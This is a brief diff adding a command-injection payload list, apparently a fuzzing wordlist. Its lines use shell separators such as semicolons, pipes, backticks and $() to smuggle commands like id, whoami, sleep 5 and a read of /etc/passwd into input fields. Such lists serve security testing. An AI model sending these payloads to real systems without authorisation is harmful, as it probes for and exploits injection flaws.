@@ -1,0 +1,12 @@
+;id
+|id
+`id`
+$(id)
+;sleep 5
+|sleep 5
+&&sleep 5
+%0aid
+;cat /etc/passwd
+|whoami
+$(sleep 5)
+;ping -c 3 127.0.0.1
